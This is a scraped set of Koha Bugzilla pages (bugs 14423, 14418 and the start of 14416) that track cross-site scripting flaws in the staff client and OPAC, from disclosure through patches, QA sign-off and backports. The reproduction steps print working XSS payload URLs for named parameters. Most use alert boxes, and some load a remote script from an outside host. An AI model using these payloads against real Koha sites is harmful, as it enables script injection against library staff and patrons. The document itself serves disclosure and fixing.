XSS bugs in catalogue search") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40499) [PASSED QA] [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : XSS bugs in catalogue search  To test  1/ hit a url like <http://localhost:8081/cgi-bin/koha/catalogue/search.pl?limit=%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E> 2/ Notice alert boxes 3/ Apply patch 4/ Reload url, no alerts 5/ Check search still works  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org>  Signed-off-by: Katrin Fischer <katrin.fischer.83@web.de> ```  [Comment 21](show_bug.cgi?id=14423#c21)  Katrin Fischer    2015-06-22 21:04:40 UTC  ``` Created [attachment 40500](attachment.cgi?id=40500&action=diff "[PASSED QA] Bug 14423 : Multiple XSS vulnerabilities in serials-search") [[details]](attachment.cgi?id=40500&action=edit "[PASSED QA] Bug 14423 : Multiple XSS vulnerabilities in serials-search") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40500) [PASSED QA] [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : Multiple XSS vulnerabilities in serials-search  To test  1/ Hit a url like <http://localhost:8081/cgi-bin/koha/serials/serials-search.pl?bookseller_filter=%22%22%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&searched=1&title_filter>= 2/ Notice alert boxes 3/ Apply patch 4/ Reload, notice fixed  Repeat for callnumber_filter EAN_filter ISSN_filter publisher_filter title_filter  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org>  Signed-off-by: Katrin Fischer <katrin.fischer.83@web.de> ```  [Comment 22](show_bug.cgi?id=14423#c22)  Katrin Fischer    2015-06-22 21:04:43 UTC  ``` Created [attachment 40501](attachment.cgi?id=40501&action=diff "[PASSED QA] Bug 14423 : Multiple XSS bugs in suggestion.pl") [[details]](attachment.cgi?id=40501&action=edit "[PASSED QA] Bug 14423 : Multiple XSS bugs in suggestion.pl") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40501) [PASSED QA] [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") : Multiple XSS bugs in suggestion.pl  To test 1/ Hit a url like <http://localhost:8081/cgi-bin/koha/suggestion/suggestion.pl?author=%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E&accepteddate_to>= 2/ Notice alert box(es) 3/ Apply patch 4/ Reload and notice alert is gone  Repeat for collection_title copyrightdate isbn manageddate_from manageddate_to publishercode suggesteddate_from suggesteddate_to  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org>  Signed-off-by: Katrin Fischer <katrin.fischer.83@web.de> ```  [Comment 23](show_bug.cgi?id=14423#c23)  Chris Cormack    2015-06-23 00:28:05 UTC  ``` Pushed to 3.20.x will be in 3.20.1 (still need to go into master) ```  [Comment 24](show_bug.cgi?id=14423#c24)  Liz Rea    2015-06-23 00:37:53 UTC  ``` Created [attachment 40503](attachment.cgi?id=40503&action=diff "Bug 14423 - tab characters in auth_subfields_structure") [[details]](attachment.cgi?id=40503&action=edit "Bug 14423 - tab characters in auth_subfields_structure") [[review]](page.cgi?id=splinter.html&bug=14423&attachment=40503) [Bug 14423](show_bug.cgi?id=14423 "CLOSED FIXED - Multiple XSS and XSRF issues in Staff Client") - tab characters in auth_subfields_structure ```  [Comment 25](show_bug.cgi?id=14423#c25)  Liz Rea    2015-06-23 01:54:43 UTC  ``` Pushed to 3.18.x will be in 3.18.08 ```  [Comment 26](show_bug.cgi?id=14423#c26)  Fridolin Somers    2015-06-23 12:43:18 UTC  ``` Pushed to 3.14.x, will be in 3.14.16 ```  [Comment 27](show_bug.cgi?id=14423#c27)  Tomás Cohen Arazi (tcohen)    2015-06-23 13:22:03 UTC  ``` Patches pushed to master.  Thanks Chris! ```  [Comment 28](show_bug.cgi?id=14423#c28)  Mason James    2015-06-23 14:05:26 UTC  ``` Pushed to 3.16.x, will be in 3.16.12 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=14423)
* - [XML](show_bug.cgi?ctype=xml&id=14423)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=14423)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=14423&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=14423&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugs.koha-community.org_d59a91ef_20250125_014238.html ===


Bugzilla – Bug 14418
XSS Flaws in OPAC Interface
Last modified: 2016-12-05 21:23:16 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=14418&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=14418&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 14418**](show_bug.cgi?id=14418)
- XSS Flaws in OPAC Interface

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
XSS Flaws in OPAC Interface

| | [Status](page.cgi?id=fields.html#bug_status): | CLOSED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Koha | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Koha "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | OPAC ([show other bugs](buglist.cgi?component=OPAC&product=Koha&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | Main | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All All | |  | | | [Importance](page.cgi?id=fields.html#importance): | P5 - low major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Owen Leonard | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Testopia | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [13618](show_bug.cgi?id=13618 "CLOSED FIXED - Add additional template filter methods and a filter presence test to Koha") [14524](show_bug.cgi?id=14524 "CLOSED FIXED - Result list RSS feed broken") | |  | Show dependency [tree](showdependencytree.cgi?id=14418&hide_resolved=1) / [graph](showdependencygraph.cgi?id=14418) | |  | | Reported: | 2015-06-18 20:49 UTC by Raschin Tavakoli | | --- | --- | | Modified: | 2016-12-05 21:23 UTC ([History](show_activity.cgi?id=14418)) | | CC List: | 6 users (show)  dsimos fridolin.somers jonathan.druart liz mtj tomascohen | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Change sponsored?:](page.cgi?id=fields.html#cf_sponsorship "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Patch complexity:](page.cgi?id=fields.html#cf_patch_complexity "A custom Drop Down field in this installation of Bugzilla.") | Small patch | | [Documentation contact:](page.cgi?id=fields.html#cf_docs_contact "The person taking responsibility for documenting the change introduced in this bug.") |  | | [Documentation submission:](page.cgi?id=fields.html#cf_manual "gitlab merge request url for this documentation submission") |  | | [Text to go in the release notes:](page.cgi?id=fields.html#cf_release_notes "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Version(s) released in:](page.cgi?id=fields.html#cf_release_version "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Circulation function:](page.cgi?id=fields.html#cf_circulation_subcomponent "A custom Multiple-Selection Box field in this installation of Bugzilla.") |  | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**Screenshots**](attachment.cgi?id=40335 "View the content of the attachment") (401.99 KB, application/x-compressed-tar)  [2015-06-18 20:49 UTC](#attach_40335 "Go to the comment associated with the attachment"), Raschin Tavakoli | [Details](attachment.cgi?id=40335&action=edit) | | [**Bug 14418 XSS Vulnerabilities**](attachment.cgi?id=40338 "View the content of the attachment") (3.59 KB, patch)  [2015-06-18 21:28 UTC](#attach_40338 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40338&action=edit) | [Diff](attachment.cgi?id=40338&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40338) | | [**Bug 14418 : XSS flaw in opac-shelves.pl**](attachment.cgi?id=40342 "View the content of the attachment") (1.91 KB, patch)  [2015-06-18 23:38 UTC](#attach_40342 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40342&action=edit) | [Diff](attachment.cgi?id=40342&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40342) | | [**Bug 14418 : More XSS vulnerabilities in opac-shelves.pl**](attachment.cgi?id=40343 "View the content of the attachment") (1.52 KB, patch)  [2015-06-18 23:43 UTC](#attach_40343 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40343&action=edit) | [Diff](attachment.cgi?id=40343&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40343) | | [**Bug 14418 XSS Vulnerabilities**](attachment.cgi?id=40350 "View the content of the attachment") (3.66 KB, patch)  [2015-06-19 09:08 UTC](#attach_40350 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40350&action=edit) | [Diff](attachment.cgi?id=40350&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40350) | | [**Bug 14418 : XSS flaw in opac-shelves.pl**](attachment.cgi?id=40351 "View the content of the attachment") (1.98 KB, patch)  [2015-06-19 09:08 UTC](#attach_40351 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40351&action=edit) | [Diff](attachment.cgi?id=40351&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40351) | | [**Bug 14418 : More XSS vulnerabilities in opac-shelves.pl**](attachment.cgi?id=40352 "View the content of the attachment") (1.58 KB, patch)  [2015-06-19 09:08 UTC](#attach_40352 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40352&action=edit) | [Diff](attachment.cgi?id=40352&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40352) | | [**[PASSED QA] Bug 14418 XSS Vulnerabilities**](attachment.cgi?id=40366 "View the content of the attachment") (3.77 KB, patch)  [2015-06-19 13:11 UTC](#attach_40366 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40366&action=edit) | [Diff](attachment.cgi?id=40366&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40366) | | [**[PASSED QA] Bug 14418 : XSS flaw in opac-shelves.pl**](attachment.cgi?id=40367 "View the content of the attachment") (2.05 KB, patch)  [2015-06-19 13:11 UTC](#attach_40367 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40367&action=edit) | [Diff](attachment.cgi?id=40367&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40367) | | [**[PASSED QA] Bug 14418 : More XSS vulnerabilities in opac-shelves.pl**](attachment.cgi?id=40368 "View the content of the attachment") (1.75 KB, patch)  [2015-06-19 13:12 UTC](#attach_40368 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40368&action=edit) | [Diff](attachment.cgi?id=40368&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14418&attachment=40368) | | [Show Obsolete](#a0) (6) [View All](attachment.cgi?bugid=14418&action=viewall&hide_obsolete=1)  [Add an attachment](attachment.cgi?bugid=14418&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=14418&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=14418#c0)  Raschin Tavakoli    2015-06-18 20:49:58 UTC  ``` Created [attachment 40335](attachment.cgi?id=40335 "Screenshots") [[details]](attachment.cgi?id=40335&action=edit "Screenshots") Screenshots  Multiple XSS and XSRF issues in the Koha OPAC interface:  Examples:  opac-search.pl, param tag: testbox:9001/cgi-bin/koha/opac-search.pl?tag="><script src='[http://cst.sba-research.org/x.js'/](http://cst.sba-research.org/x.js%27/)>&q=fantastique  opac-shelves.pl, param direction: /cgi-bin/koha/opac-shelves.pl?viewshelf=19&sort=author&direction="><script src='[http://cst.sba-research.org/x.js'/](http://cst.sba-research.org/x.js%27/)>  opac-shelves.pl, param display: /cgi-bin/koha/opac-shelves.pl?op=modif&shelfnumber=16&display="><script src='[http://cst.sba-research.org/x.js'/](http://cst.sba-research.org/x.js%27/)>  ---  Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research. Contact: cst@sba-research.org ```   [Comment 1](show_bug.cgi?id=14418#c1)  Chris Cormack    2015-06-18 21:28:19 UTC  Comment hidden (obsolete)  ``` Created [attachment 40338](attachment.cgi?id=40338&action=diff "Bug 14418 XSS Vulnerabilities") [[details]](attachment.cgi?id=40338&action=edit "Bug 14418 XSS Vulnerabilities") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40338) [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") XSS Vulnerabilities  Fix for /cgi-bin/koha/opac-search.pl  To test  1/ Hit /cgi-bin/koha/opac-search.pl?tag="><script src='[http://cst.sba-research.org/x.js'/](http://cst.sba-research.org/x.js%27/)>&q=a 2/ Notice the js is executed 3/ Apply patch 4/ Reload page, notice it is no longer executed 5/ Test the rss links work still ```  [Comment 2](show_bug.cgi?id=14418#c2)  Chris Cormack    2015-06-18 21:33:35 UTC  ``` I suspect the problem is the query_cgi variable not being escaped in other templates as well.  I'll come back to this bug, if no one else has fixed the others, but I am going to look at 14416 first. ```   [Comment 3](show_bug.cgi?id=14418#c3)  Chris Cormack    2015-06-18 23:38:25 UTC  Comment hidden (obsolete)  ``` Created [attachment 40342](attachment.cgi?id=40342&action=diff "Bug 14418 : XSS flaw in opac-shelves.pl") [[details]](attachment.cgi?id=40342&action=edit "Bug 14418 : XSS flaw in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40342) [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : XSS flaw in opac-shelves.pl  To test: 1/ Create a list and add at least one item to it 2/ Hit a url like <http://192.168.2.18/cgi-bin/koha/opac-shelves.pl?viewshelf=7&sort=author&direction=%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E>   Where the shelf id is the number of the list you created, notice the js is executed 3/ Apply the patch 4/ Reload the page notice the js is now escaped ```   [Comment 4](show_bug.cgi?id=14418#c4)  Chris Cormack    2015-06-18 23:43:18 UTC  Comment hidden (obsolete)  ``` Created [attachment 40343](attachment.cgi?id=40343&action=diff "Bug 14418 : More XSS vulnerabilities in opac-shelves.pl") [[details]](attachment.cgi?id=40343&action=edit "Bug 14418 : More XSS vulnerabilities in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40343) [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : More XSS vulnerabilities in opac-shelves.pl  To test: 1/ Hit a url like /cgi-bin/koha/opac-shelves.pl?viewshelf=7&op=modif&display="><script>alert('oh noes')</script>  Where the id is a valid shelf id 2/ Notice the js is executed 3/ Apply patch 4/ Reload page 5/ Notice input is now escaped on display ```   [Comment 5](show_bug.cgi?id=14418#c5)  Jonathan Druart    2015-06-19 09:08:11 UTC  Comment hidden (obsolete)  ``` Created [attachment 40350](attachment.cgi?id=40350&action=diff "Bug 14418 XSS Vulnerabilities") [[details]](attachment.cgi?id=40350&action=edit "Bug 14418 XSS Vulnerabilities") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40350) [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") XSS Vulnerabilities  Fix for /cgi-bin/koha/opac-search.pl  To test  1/ Hit /cgi-bin/koha/opac-search.pl?tag="><script src='[http://cst.sba-research.org/x.js'/](http://cst.sba-research.org/x.js%27/)>&q=a 2/ Notice the js is executed 3/ Apply patch 4/ Reload page, notice it is no longer executed 5/ Test the rss links work still  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 6](show_bug.cgi?id=14418#c6)  Jonathan Druart    2015-06-19 09:08:16 UTC  Comment hidden (obsolete)  ``` Created [attachment 40351](attachment.cgi?id=40351&action=diff "Bug 14418 : XSS flaw in opac-shelves.pl") [[details]](attachment.cgi?id=40351&action=edit "Bug 14418 : XSS flaw in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40351) [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : XSS flaw in opac-shelves.pl  To test: 1/ Create a list and add at least one item to it 2/ Hit a url like <http://192.168.2.18/cgi-bin/koha/opac-shelves.pl?viewshelf=7&sort=author&direction=%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E>   Where the shelf id is the number of the list you created, notice the js is executed 3/ Apply the patch 4/ Reload the page notice the js is now escaped  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 7](show_bug.cgi?id=14418#c7)  Jonathan Druart    2015-06-19 09:08:19 UTC  Comment hidden (obsolete)  ``` Created [attachment 40352](attachment.cgi?id=40352&action=diff "Bug 14418 : More XSS vulnerabilities in opac-shelves.pl") [[details]](attachment.cgi?id=40352&action=edit "Bug 14418 : More XSS vulnerabilities in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40352) [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : More XSS vulnerabilities in opac-shelves.pl  To test: 1/ Hit a url like /cgi-bin/koha/opac-shelves.pl?viewshelf=7&op=modif&display="><script>alert('oh noes')</script>  Where the id is a valid shelf id 2/ Notice the js is executed 3/ Apply patch 4/ Reload page 5/ Notice input is now escaped on display  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```  [Comment 8](show_bug.cgi?id=14418#c8)  Jonathan Druart    2015-06-19 09:09:35 UTC  ``` Comment on [attachment 40351](attachment.cgi?id=40351&action=diff "Bug 14418 : XSS flaw in opac-shelves.pl") [[details]](attachment.cgi?id=40351&action=edit "Bug 14418 : XSS flaw in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40351) [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : XSS flaw in opac-shelves.pl  Review of [attachment 40351](attachment.cgi?id=40351&action=diff "Bug 14418 : XSS flaw in opac-shelves.pl") [[details]](attachment.cgi?id=40351&action=edit "Bug 14418 : XSS flaw in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40351): -----------------------------------------------------------------  ::: koha-tmpl/opac-tmpl/bootstrap/en/modules/opac-shelves.tt @@ +168,4 @@ >                                          <span class="sendlist"><a href="/cgi-bin/koha/opac-sendshelf.pl?shelfid=[% shelfnumber | html %]" class="send" onclick="open('/cgi-bin/koha/opac-sendshelf.pl?shelfid=[% shelfnumber | html %]','win_form','scrollbars=no,resizable=no,height=300,width=450,top=50,left=100'); return false; ">Send list</a></span> >                                      [% END %] >   > +                                    <a class="print-small" target="_blank" href="/cgi-bin/koha/opac-shelves.pl?viewshelf=[% shelfnumber %]&sort=[% sort %]&direction=[% direction |uri %]&print=1">Print list</a>  I don't manage to simulate an attack with "sort", but it could certainly be a good idea to escape it also. ```  [Comment 9](show_bug.cgi?id=14418#c9)  Katrin Fischer    2015-06-19 13:11:47 UTC  ``` Created [attachment 40366](attachment.cgi?id=40366&action=diff "[PASSED QA] Bug 14418 XSS Vulnerabilities") [[details]](attachment.cgi?id=40366&action=edit "[PASSED QA] Bug 14418 XSS Vulnerabilities") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40366) [PASSED QA] [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") XSS Vulnerabilities  Fix for /cgi-bin/koha/opac-search.pl  To test  1/ Hit /cgi-bin/koha/opac-search.pl?tag="><script src='[http://cst.sba-research.org/x.js'/](http://cst.sba-research.org/x.js%27/)>&q=a 2/ Notice the js is executed 3/ Apply patch 4/ Reload page, notice it is no longer executed 5/ Test the rss links work still  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> Confirmed bug and that the patch fixes it. ```  [Comment 10](show_bug.cgi?id=14418#c10)  Katrin Fischer    2015-06-19 13:11:59 UTC  ``` Created [attachment 40367](attachment.cgi?id=40367&action=diff "[PASSED QA] Bug 14418 : XSS flaw in opac-shelves.pl") [[details]](attachment.cgi?id=40367&action=edit "[PASSED QA] Bug 14418 : XSS flaw in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40367) [PASSED QA] [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : XSS flaw in opac-shelves.pl  To test: 1/ Create a list and add at least one item to it 2/ Hit a url like <http://192.168.2.18/cgi-bin/koha/opac-shelves.pl?viewshelf=7&sort=author&direction=%22%3E%3Cscript%3Ealert%28%27oh%20noes%27%29%3C/script%3E>   Where the shelf id is the number of the list you created, notice the js is executed 3/ Apply the patch 4/ Reload the page notice the js is now escaped  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 11](show_bug.cgi?id=14418#c11)  Katrin Fischer    2015-06-19 13:12:27 UTC  ``` Created [attachment 40368](attachment.cgi?id=40368&action=diff "[PASSED QA] Bug 14418 : More XSS vulnerabilities in opac-shelves.pl") [[details]](attachment.cgi?id=40368&action=edit "[PASSED QA] Bug 14418 : More XSS vulnerabilities in opac-shelves.pl") [[review]](page.cgi?id=splinter.html&bug=14418&attachment=40368) [PASSED QA] [Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : More XSS vulnerabilities in opac-shelves.pl  To test: 1/ Hit a url like /cgi-bin/koha/opac-shelves.pl?viewshelf=7&op=modif&display="><script>alert('oh noes')</script>  Where the id is a valid shelf id 2/ Notice the js is executed 3/ Apply patch 4/ Reload page 5/ Notice input is now escaped on display  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> Tested in Debian, couldn't reproduce the alert in Iceweasel, but in Chromium. Patch fixes it. ```  [Comment 12](show_bug.cgi?id=14418#c12)  Tomás Cohen Arazi (tcohen)    2015-06-22 14:39:29 UTC  ``` Patches pushed to master.  Thanks Chris! ```  [Comment 13](show_bug.cgi?id=14418#c13)  Chris Cormack    2015-06-22 21:44:52 UTC  ``` Pushed to 3.20.x will be in 3.20.1 ```  [Comment 14](show_bug.cgi?id=14418#c14)  Liz Rea    2015-06-23 01:55:42 UTC  ``` Pushed to 3.18.x will be in 3.18.08 ```  [Comment 15](show_bug.cgi?id=14418#c15)  Fridolin Somers    2015-06-23 09:54:12 UTC  ``` Pushed to 3.14.x, will be in 3.14.16  Commit "[Bug 14418](show_bug.cgi?id=14418 "CLOSED FIXED - XSS Flaws in OPAC Interface") : XSS flaw in opac-shelves.pl" is useless in 3.14.x ```  [Comment 16](show_bug.cgi?id=14418#c16)  Jonathan Druart    2015-07-13 14:40:47 UTC  ``` This patch breaks the RSS link, see [bug 14524](show_bug.cgi?id=14524 "CLOSED FIXED - Result list RSS feed broken"). ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=14418)
* - [XML](show_bug.cgi?ctype=xml&id=14418)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=14418)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=14418&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=14418&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugs.koha-community.org_04262a23_20250125_014236.html ===


Bugzilla – Bug 14416
Stored XSS flaw affects OPAC and Staff interface
Last modified: 2017-06-14 22:11:54 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=14416&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=14416&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

[**Bug 14416**](show_bug.cgi?id=14416)
- Stored XSS flaw affects OPAC and Staff interface

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Stored XSS flaw affects OPAC and Staff interface

| | [Status](page.cgi?id=fields.html#bug_status): | CLOSED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Koha | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Koha "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Lists ([show other bugs](buglist.cgi?component=Lists&product=Koha&bug_status=__open__)) | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | PC Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | P5 - low major | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Galen Charlton | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Testopia | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | Duplicates (1): | [14415](show_bug.cgi?id=14415 "RESOLVED DUPLICATE")  ([view as bug list](buglist.cgi?bug_id=14415)) | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [13618](show_bug.cgi?id=13618 "CLOSED FIXED - Add additional template filter methods and a filter presence test to Koha") [14568](show_bug.cgi?id=14568 "CLOSED FIXED") | |  | Show dependency [tree](showdependencytree.cgi?id=14416&hide_resolved=1) / [graph](showdependencygraph.cgi?id=14416) | |  